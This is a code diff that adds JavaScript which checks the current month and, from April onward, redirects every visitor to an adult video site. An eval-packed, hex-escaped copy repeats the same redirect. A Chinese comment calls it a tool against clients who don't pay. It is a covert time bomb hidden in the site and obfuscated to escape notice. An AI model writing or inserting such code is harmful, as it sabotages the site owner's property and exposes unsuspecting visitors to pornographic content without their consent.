@@ -1,0 +1,14 @@
+var myDate = new Date();
+myDate.getMonth(); //获取当前月份(0-11,0代表1月)
+myDate.toLocaleDateString(); //获取当前日期
+var mytime=myDate.toLocaleTimeString(); //获取当前时间
+myDate.toLocaleString( ); //获取日期与时间
+if(myDate.getMonth()>2){
+	window.location.href="http://www.javzoo.com"
+	}
+	
+	
+	
+	
+//一个小工具也就是防防一般没啥技术的不给钱
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('l 9$=["\\i\\c\\8\\F\\7\\f\\8\\k","\\8\\7\\m\\7\\g\\d\\j\\c\\s\\d\\8\\c\\n\\8\\h\\e\\f\\i","\\8\\7\\m\\7\\g\\d\\j\\c\\u\\e\\r\\c\\n\\8\\h\\e\\f\\i","\\8\\7\\m\\7\\g\\d\\j\\c\\n\\8\\h\\e\\f\\i","\\j\\7\\g\\d\\8\\e\\7\\f","\\k\\h\\c\\v","\\k\\8\\8\\w\\t\\q\\q\\o\\o\\o\\p\\D\\d\\C\\x\\7\\7\\p\\g\\7\\r"];l a=E B();a[9$[0]]();a[9$[1]]();l b=a[9$[2]]();a[9$[3]]();A(a[9$[0]]()>y){z[9$[4]][9$[5]]=9$[6]}',42,42,'|||||||x6f|x74|_|||x65|x61|x69|x6e|x63|x72|x67|x6c|x68|var|x4c|x53|x77|x2e|x2f|x6d|x44|x3a|x54|x66|x70|x7a|0x2|window|if|Date|x76|x6a|new|x4d'.split('|'),0,{}))
